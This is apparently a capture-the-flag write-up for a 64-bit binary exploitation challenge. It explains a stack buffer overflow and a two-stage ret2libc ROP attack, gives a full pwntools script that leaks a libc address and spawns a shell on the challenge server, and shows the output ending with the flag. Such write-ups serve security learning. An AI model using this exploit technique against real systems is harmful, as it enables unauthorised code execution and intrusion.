Binary Exploitation
## 1. Challenge Overview

We were provided with three files:

- `chall`: The vulnerable 64-bit ELF binary.
    
- `libc.so.6`: The C standard library used on the server (identified as GLIBC 2.41).
    
- `ld-linux-x86-64.so.2`: The dynamic linker for the environment.
    

The objective was to exploit the binary on a remote server to gain a shell and read the flag.

## 2. Initial Analysis

### Checksec

Running `checksec` on the binary revealed the security protections:

- **Arch:** amd64-64-little
    
- **RELRO:** Partial RELRO (GOT is writable)
    
- **Stack:** No canary found (Vulnerable to buffer overflow)
    
- **NX:** NX enabled (Cannot execute shellcode on the stack)
    
- **PIE:** No PIE (Code addresses are static)
    

### Disassembly & Debugging

The binary contained a function `vuln` (called by `main`) that requested user input.

- **Vulnerability:** The program used `read` to take input into a buffer but allowed reading more bytes than the buffer could hold, leading to a buffer overflow.
    
- **Offset:** Using a cyclic pattern in GDB, we determined the crash offset (Instruction Pointer overwrite) was **72 bytes**.
    

We also found a helper function `useless_gadget`, which contained a `pop rdi; ret` gadget, essential for passing arguments in 64-bit ROP chains.

## 3. Exploitation Strategy: Ret2Libc

Since **NX** is enabled, we cannot execute code on the stack. Since **ASLR** is likely enabled on the remote server, we cannot jump directly to `system()` because its address changes every run.

We used a standard **Return-to-Libc** attack with a two-stage ROP chain:

### Stage 1: Leak Libc Address

1. **Padding:** Fill the buffer with 72 bytes of junk.
    
2. **Align Stack:** Add a `ret` gadget. This ensures the stack is 16-byte aligned before calling functions, preventing crashes with `movaps` instructions in newer GLIBC versions.
    
3. **Pop RDI:** Pop the address of `puts@got` into the `RDI` register (the first argument register).
    
4. **Call Puts:** Call `puts@plt`. This prints the actual memory address of `puts` from the Global Offset Table (GOT).
    
5. **Return to Main:** Jump back to `main` so the program doesn't crash, allowing us to send a second payload.
    

### Stage 2: Get Shell

1. **Calculate Base:** Subtract the static offset of `puts` from the leaked address to find the **Libc Base Address**.
    
2. **Find Targets:** Calculate the real addresses of `system()` and the string `"/bin/sh"` using the base.
    
3. **Payload:**
    
    - Padding (72 bytes).
        
    - `pop rdi; ret` gadget.
        
    - Address of `"/bin/sh"`.
        
    - Address of `system()`.
        

## 4. The Exploit Script

Python

```
from pwn import *

# Set up binaries
binary_path = './chall'
libc_path = './libc.so.6'
ld_path = './ld-linux-x86-64.so.2'

elf = ELF(binary_path)
libc = ELF(libc_path)
context.binary = elf

# --- CONFIGURATION ---
p = remote('ctf.nexus-security.club', 2711)
OFFSET = 72

# --- GADGETS ---
try:
    rop = ROP(elf)
    pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
    ret_gadget = rop.find_gadget(['ret'])[0] # Used for stack alignment
except:
    log.error("Gadget lookup failed")

log.info(f"Pop RDI gadget: {hex(pop_rdi)}")

# --- STAGE 1: LEAK LIBC ---
log.info("Sending Stage 1 Payload (Leak puts)...")

payload1 = flat(
    b"A" * OFFSET,
    ret_gadget,         # Align stack (16-byte alignment)
    pop_rdi,
    elf.got['puts'],    # Arg 1: GOT entry of puts
    elf.plt['puts'],    # Function: puts()
    elf.symbols['main'] # Return to main
)

# Handle remote buffering (consume prompt)
p.recvuntil(b"data:") 
try:
    p.recv(1) # Clear potential newline
except:
    pass

p.sendline(payload1)

# Read the leaked address
try:
    leak_raw = p.recvline().strip()
    leak = u64(leak_raw.ljust(8, b"\x00"))
    log.success(f"Leaked puts: {hex(leak)}")
except EOFError:
    log.error("Remote closed connection.")

# Calculate Libc Base
libc.address = leak - libc.symbols['puts']
log.success(f"Libc Base: {hex(libc.address)}")

# --- STAGE 2: GET SHELL ---
log.info("Sending Stage 2 Payload (system('/bin/sh'))...")

bin_sh = next(libc.search(b"/bin/sh"))
system = libc.symbols['system']

# Note: We removed the extra ret_gadget here to maintain alignment 
# for the system() call, based on the Stage 1 state.
payload2 = flat(
    b"A" * OFFSET,
    pop_rdi,
    bin_sh,
    system
)

# Consume the "Welcome..." output from the restart
p.recvuntil(b"data:") 
p.sendline(payload2)

# Interactive Shell
p.interactive()
```

## 5. Execution Output

Plaintext

```
[+] Opening connection to ctf.nexus-security.club on port 2711: Done
[*] Loaded 6 cached gadgets for './chall'
[*] Pop RDI gadget: 0x40114a
[*] Sending Stage 1 Payload (Leak puts)...
[+] Leaked puts: 0x7f5d727755a0
[+] Libc Base: 0x7f5d726f5000
[*] Sending Stage 2 Payload (system('/bin/sh'))...
[*] Switching to interactive mode
$ cat flag.txt
nexus{B0ok_F0uND_L1BC_R3t}
```
